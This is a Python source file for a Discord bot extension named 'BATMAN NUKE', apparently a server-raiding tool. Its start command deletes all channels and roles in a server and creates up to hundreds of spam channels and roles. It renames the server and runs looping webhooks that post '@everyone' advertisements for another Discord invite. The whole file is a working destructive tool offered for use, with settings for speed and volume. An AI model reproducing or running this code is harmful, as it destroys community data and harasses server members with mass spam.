import discord
from discord.ext import commands
import json
import asyncio
import os
from datetime import datetime
import random

black = "\x1b[30m"
white = "\x1b[37m"
red = "\x1b[31m"

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.webhook_spam = True
        self.config_file = "data/nuke_config.json"
        self.excluded_guilds = [1289325760040927264]
        self.default_config = {
            "webhook_message": "@everyone JOIN discord.gg/roster",
            "server_name": "NUKED BY BATMAN",
            "webhook_delay": 0.1, 
            "channel_name": "nuked-by-batman",
            "role_name": "BATMAN",
            "channel_amount": 100,
            "role_amount": 100,
            "webhook_amount": 25,
            "nuke_speed": 0.05 
        }
        self.config = self.load_config()

    def load_config(self):
        if not os.path.exists('data'):
            os.makedirs('data')
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                return json.load(f)
        else:
            self.save_config(self.default_config)
            return self.default_config

    def save_config(self, config):
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=4)

    @commands.group(invoke_without_command=True)
    async def nuke(self, ctx):
        if ctx.invoked_subcommand is None:
            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯

{black}[{white}Settings{black}]
{black}[{white}Message{black}] {white}{self.config['webhook_message'][:20]}...
{black}[{white}Name{black}] {white}{self.config['server_name']}
{black}[{white}Delay{black}] {white}{self.config['webhook_delay']}s
{black}[{white}Speed{black}] {white}{self.config['nuke_speed']}s
{black}[{white}Channels{black}] {white}{self.config['channel_amount']}
{black}[{white}Roles{black}] {white}{self.config['role_amount']}
{black}[{white}Webhooks{black}] {white}{self.config['webhook_amount']}

{black}[{white}Commands{black}]
{black}[{white}1{black}] {white}message <text> {black}- Set webhook message
{black}[{white}2{black}] {white}name <text> {black}- Set server name
{black}[{white}3{black}] {white}delay <seconds> {black}- Set webhook delay
{black}[{white}4{black}] {white}speed <seconds> {black}- Set nuke speed
{black}[{white}5{black}] {white}channels <amount> {black}- Set channel amount
{black}[{white}6{black}] {white}roles <amount> {black}- Set role amount
{black}[{white}7{black}] {white}webhooks <amount> {black}- Set webhook amount
{black}[{white}8{black}] {white}reset {black}- Reset settings
{black}[{white}9{black}] {white}start {black}- Start nuke
{black}[{white}0{black}] {white}stop {black}- Stop nuke```""")

    @nuke.command()
    async def message(self, ctx, *, msg):
        self.config["webhook_message"] = msg
        self.save_config(self.config)
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Success{black}] {white}Webhook message set```""")

    @nuke.command()
    async def name(self, ctx, *, name):
        self.config["server_name"] = name
        self.save_config(self.config)
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Success{black}] {white}Server name set```""")

    @nuke.command()
    async def speed(self, ctx, speed: float):
        if speed < 0.01:
            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Error{black}] {white}Speed must be at least 0.01 seconds```""")
            return
        self.config["nuke_speed"] = speed
        self.save_config(self.config)
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Success{black}] {white}Nuke speed set to {speed}s```""")

    @nuke.command()
    async def delay(self, ctx, delay: float):
        if delay < 0.1:
            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Error{black}] {white}Delay must be at least 0.1 seconds```""")
            return
        self.config["webhook_delay"] = delay
        self.save_config(self.config)
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Success{black}] {white}Webhook delay set to {delay}s```""")

    @nuke.command()
    async def channels(self, ctx, amount: int):
        if not 1 <= amount <= 500:
            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Error{black}] {white}Channel amount must be between 1 and 500```""")
            return
        self.config["channel_amount"] = amount
        self.save_config(self.config)
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Success{black}] {white}Channel amount set to {amount}```""")

    @nuke.command()
    async def roles(self, ctx, amount: int):
        if not 1 <= amount <= 250:
            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Error{black}] {white}Role amount must be between 1 and 250```""")
            return
        self.config["role_amount"] = amount
        self.save_config(self.config)
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Success{black}] {white}Role amount set to {amount}```""")

    @nuke.command()
    async def webhooks(self, ctx, amount: int):
        if not 1 <= amount <= 50:
            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Error{black}] {white}Webhook amount must be between 1 and 50```""")
            return
        self.config["webhook_amount"] = amount
        self.save_config(self.config)
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Success{black}] {white}Webhook amount set to {amount}```""")

    @nuke.command()
    async def reset(self, ctx):
        self.config = self.default_config.copy()
        self.save_config(self.config)
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Success{black}] {white}Settings reset to default```""")

    @nuke.command()
    async def stop(self, ctx):
        self.webhook_spam = False
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Status{black}] {white}Stopping all webhook spam...```""")

    @nuke.command()
    async def start(self, ctx):
        if ctx.guild.id in self.excluded_guilds:
            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Error{black}] {white}This server is protected```""")
            return

        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Warning{black}] {white}Type 'yes' to nuke this server```""")
        
        try:
            msg = await self.bot.wait_for('message', 
                                        check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
                                        timeout=30.0)
            if msg.content.lower() != "yes":
                await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Status{black}] {white}Operation cancelled```""")
                return
        except asyncio.TimeoutError:
            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Error{black}] {white}Operation timed out```""")
            return

        self.webhook_spam = True
        await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Status{black}] {white}Initiating nuke sequence...```""")

        async def spam_webhook(webhook):
            while self.webhook_spam:
                try:
                    await webhook.send(content=self.config["webhook_message"])
                    await asyncio.sleep(self.config["webhook_delay"])
                except:
                    break

        async def create_webhook_channel(name, num):
            try:
                channel = await ctx.guild.create_text_channel(f"{name}-{num}")
                webhooks = []
                for i in range(self.config["webhook_amount"]):
                    webhook = await channel.create_webhook(name=f"BATMAN-{i+1}")
                    webhooks.append(webhook)
                for webhook in webhooks:
                    asyncio.create_task(spam_webhook(webhook))
                return True
            except:
                return False

        try:
            delete_tasks = []
            for channel in ctx.guild.channels:
                delete_tasks.append(asyncio.create_task(channel.delete()))
            for role in ctx.guild.roles:
                if role.name != "@everyone":
                    delete_tasks.append(asyncio.create_task(role.delete()))
            
            await asyncio.gather(*delete_tasks)
            await asyncio.sleep(self.config["nuke_speed"])

            channel_tasks = []
            for i in range(self.config["channel_amount"]):
                channel_tasks.append(create_webhook_channel(self.config["channel_name"], i+1))
                await asyncio.sleep(self.config["nuke_speed"])

            role_tasks = []
            for i in range(self.config["role_amount"]):
                role_tasks.append(ctx.guild.create_role(name=f"{self.config['role_name']}-{i+1}"))
                await asyncio.sleep(self.config["nuke_speed"])

            await ctx.guild.edit(name=self.config["server_name"])

            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Success{black}] {white}Nuke completed```""")

        except Exception as e:
            await ctx.send(f"""```ansi
{black}[ {red}BATMAN NUKE {black}]
{black}[{white}Error{black}] {white}{str(e)}```""")

def setup(bot):
    bot.add_cog(Nuke(bot))
